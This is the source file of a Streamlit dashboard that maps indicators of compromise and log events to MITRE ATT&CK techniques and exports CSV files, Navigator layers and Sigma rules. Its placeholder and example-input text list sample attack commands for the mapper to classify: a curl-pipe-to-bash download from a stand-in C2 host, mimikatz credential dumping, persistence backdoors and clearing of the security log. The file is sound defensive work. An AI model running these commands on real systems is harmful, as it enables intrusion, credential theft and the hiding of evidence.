"""
app.py — Streamlit web dashboard for MITRE ATT&CK TTP Mapper.

Run with: streamlit run app.py
"""

import io
import json
import tempfile
import os
from datetime import datetime, timezone

import streamlit as st
import pandas as pd
import plotly.express as px

from mapping_engine import map_iocs, get_tactic_summary, get_technique_frequency
from navigator_export import generate_navigator_layer
from sigma_generator import generate_sigma_rules, rules_to_markdown
from threat_intel import extract_iocs, classify_iocs
from utils import write_csv

# ---------------------------------------------------------------------------
# Page config
# ---------------------------------------------------------------------------
st.set_page_config(
    page_title="MITRE ATT&CK TTP Mapper",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded",
)

# ---------------------------------------------------------------------------
# Sidebar
# ---------------------------------------------------------------------------
with st.sidebar:
    st.title("🛡️ TTP Mapper")
    st.markdown("---")

    min_confidence = st.selectbox(
        "Minimum Confidence",
        ["Low", "Medium", "High"],
        index=0,
        help="Filter results by minimum confidence level.",
    )

    layer_name = st.text_input(
        "Navigator Layer Name",
        value="Streamlit TTP Mapper Layer",
        help="Name for the exported ATT&CK Navigator layer.",
    )

    st.markdown("---")
    st.markdown("### About")
    st.markdown(
        "Map IOCs and log events to **MITRE ATT&CK** techniques. "
        "Paste text, upload files, and export results as CSV, "
        "Navigator layers, or Sigma rules."
    )
    st.markdown(
        "[MITRE ATT&CK](https://attack.mitre.org/) | "
        "[Navigator](https://mitre-attack.github.io/attack-navigator/)"
    )

# ---------------------------------------------------------------------------
# Main area
# ---------------------------------------------------------------------------
st.title("🛡️ MITRE ATT&CK TTP Mapper")
st.caption("Map indicators of compromise to ATT&CK techniques in seconds.")

# Input tabs
tab_paste, tab_upload = st.tabs(["📝 Paste IOCs", "📁 Upload File"])

ioc_list = []

with tab_paste:
    raw_text = st.text_area(
        "Enter IOCs or log events (one per line)",
        height=200,
        placeholder=(
            "powershell -enc ZABvAHcAbgBsAG8AYQBk\n"
            "mimikatz sekurlsa::logonpasswords\n"
            "curl http://malicious.example.com/beacon\n"
            "schtasks /create /tn backdoor /tr evil.exe\n"
            "net user hacker /add"
        ),
    )
    if raw_text.strip():
        ioc_list = [line.strip() for line in raw_text.strip().splitlines() if line.strip()]

with tab_upload:
    uploaded = st.file_uploader(
        "Upload a log file",
        type=["txt", "json", "csv", "xml", "cef"],
        help="Supported: plain text, JSON/NDJSON, CSV, Sysmon XML, CEF",
    )
    if uploaded is not None:
        content = uploaded.read().decode("utf-8", errors="replace")
        ext = uploaded.name.rsplit(".", 1)[-1].lower() if "." in uploaded.name else "txt"

        # Save to temp file so parsers can read it
        with tempfile.NamedTemporaryFile(mode="w", suffix=f".{ext}", delete=False) as tmp:
            tmp.write(content)
            tmp_path = tmp.name

        try:
            if ext == "json":
                # Try cloud parser first, fall back to generic JSON
                try:
                    from parsers.cloud_parsers import parse_cloud_log
                    ioc_list = parse_cloud_log(tmp_path)
                except Exception:
                    from parsers.log_parsers import parse_json_log
                    ioc_list = parse_json_log(tmp_path)
            elif ext == "xml":
                from parsers.log_parsers import parse_sysmon_xml
                ioc_list = parse_sysmon_xml(tmp_path)
            elif ext == "csv":
                from parsers.log_parsers import parse_csv_log
                ioc_list = parse_csv_log(tmp_path)
            elif ext == "cef":
                from parsers.log_parsers import parse_cef
                ioc_list = parse_cef(tmp_path)
            else:
                ioc_list = [l.strip() for l in content.splitlines() if l.strip()]
        finally:
            os.unlink(tmp_path)

        st.success(f"Loaded **{len(ioc_list)}** entries from `{uploaded.name}`")

# ---------------------------------------------------------------------------
# Run mapping
# ---------------------------------------------------------------------------
if ioc_list:
    with st.spinner("Mapping IOCs to ATT&CK techniques..."):
        results = map_iocs(ioc_list, min_confidence=min_confidence)

    if not results:
        st.warning("No ATT&CK techniques matched the provided IOCs.")
        st.stop()

    # --- Metrics row ---
    unique_techs = len(set(r["Technique ID"] for r in results))
    tactic_summary = get_tactic_summary(results)
    tech_freq = get_technique_frequency(results)

    col1, col2, col3, col4 = st.columns(4)
    col1.metric("IOCs Analyzed", len(ioc_list))
    col2.metric("Technique Matches", len(results))
    col3.metric("Unique Techniques", unique_techs)
    col4.metric("Tactics Covered", len(tactic_summary))

    st.markdown("---")

    # --- Results table with coloured confidence ---
    st.subheader("Mapping Results")
    df = pd.DataFrame(results)

    def _color_confidence(val):
        colors = {"High": "#e60000", "Medium": "#ff9632", "Low": "#ffe766"}
        bg = colors.get(val, "")
        text_color = "white" if val == "High" else "black"
        return f"background-color: {bg}; color: {text_color}" if bg else ""

    display_cols = [
        "IOC Summary", "Technique ID", "Mapped Technique",
        "Tactic", "Confidence", "Matched Keywords",
    ]
    available_cols = [c for c in display_cols if c in df.columns]
    styled = df[available_cols].style.applymap(_color_confidence, subset=["Confidence"])
    st.dataframe(styled, use_container_width=True, height=400)

    st.markdown("---")

    # --- Charts ---
    st.subheader("Analytics")
    chart_left, chart_right = st.columns(2)

    with chart_left:
        st.markdown("**Tactic Distribution**")
        tactic_df = pd.DataFrame(
            list(tactic_summary.items()), columns=["Tactic", "Count"]
        ).sort_values("Count", ascending=True)
        fig_tactic = px.bar(
            tactic_df, x="Count", y="Tactic", orientation="h",
            color="Count", color_continuous_scale="Reds",
        )
        fig_tactic.update_layout(height=400, showlegend=False)
        st.plotly_chart(fig_tactic, use_container_width=True)

    with chart_right:
        st.markdown("**Confidence Breakdown**")
        conf_counts = df["Confidence"].value_counts().reset_index()
        conf_counts.columns = ["Confidence", "Count"]
        color_map = {"High": "#e60000", "Medium": "#ff9632", "Low": "#ffe766"}
        fig_conf = px.pie(
            conf_counts, names="Confidence", values="Count",
            hole=0.45, color="Confidence", color_discrete_map=color_map,
        )
        fig_conf.update_layout(height=400)
        st.plotly_chart(fig_conf, use_container_width=True)

    # Technique frequency chart
    st.markdown("**Technique Frequency**")
    freq_df = pd.DataFrame(
        list(tech_freq.items()), columns=["Technique", "Count"]
    ).sort_values("Count", ascending=True)
    fig_freq = px.bar(
        freq_df, x="Count", y="Technique", orientation="h",
        color="Count", color_continuous_scale="YlOrRd",
    )
    fig_freq.update_layout(height=max(300, len(freq_df) * 30), showlegend=False)
    st.plotly_chart(fig_freq, use_container_width=True)

    st.markdown("---")

    # --- IOC Extraction ---
    st.subheader("IOC Extraction")
    all_text = " ".join(ioc_list)
    extracted = extract_iocs(all_text)
    has_iocs = any(v for v in extracted.values())

    if has_iocs:
        ec1, ec2, ec3 = st.columns(3)
        with ec1:
            st.markdown("**IPs**")
            for ip in extracted.get("ips", []):
                st.code(ip)
        with ec2:
            st.markdown("**URLs**")
            for url in extracted.get("urls", []):
                st.code(url)
        with ec3:
            st.markdown("**Domains**")
            for dom in extracted.get("domains", []):
                st.code(dom)
    else:
        st.info("No structured IOCs (IPs, URLs, domains, hashes) extracted from input.")

    st.markdown("---")

    # --- Export section ---
    st.subheader("Export")
    exp1, exp2, exp3 = st.columns(3)

    with exp1:
        csv_buf = io.StringIO()
        df.to_csv(csv_buf, index=False)
        st.download_button(
            "📄 Download CSV Report",
            data=csv_buf.getvalue(),
            file_name="ttp_mapping_report.csv",
            mime="text/csv",
        )

    with exp2:
        layer = generate_navigator_layer(results, name=layer_name)
        layer_json = json.dumps(layer, indent=2)
        st.download_button(
            "🗺️ Download Navigator Layer",
            data=layer_json,
            file_name="navigator_layer.json",
            mime="application/json",
        )

    with exp3:
        full_export = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "total_iocs": len(ioc_list),
            "total_matches": len(results),
            "unique_techniques": unique_techs,
            "tactics_covered": len(tactic_summary),
            "tactic_summary": tactic_summary,
            "technique_frequency": tech_freq,
            "results": results,
            "navigator_layer": layer,
        }
        st.download_button(
            "📦 Download Full Analysis JSON",
            data=json.dumps(full_export, indent=2, default=str),
            file_name="full_analysis.json",
            mime="application/json",
        )

else:
    # --- Demo section when no input ---
    with st.expander("💡 Example Inputs — click to expand", expanded=True):
        st.markdown(
            """
Try pasting any of these into the **Paste IOCs** tab:

```
powershell -enc ZABvAHcAbgBsAG8AYQBk executing encoded payload
mimikatz sekurlsa::logonpasswords credential dumping
schtasks /create /tn backdoor /tr C:\\malware.exe
curl http://c2.evil.com/beacon.sh | bash
net user hacker P@ssw0rd /add
rundll32 javascript:void(document.write())
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor
wevtutil cl Security
ransomware encrypted all files with .locked extension
rdp brute force attempt on port 3389
```

Or upload a **CloudTrail JSON**, **Sysmon XML**, or **CSV** log file.
            """
        )
    st.info("Enter IOCs above or upload a log file to get started.")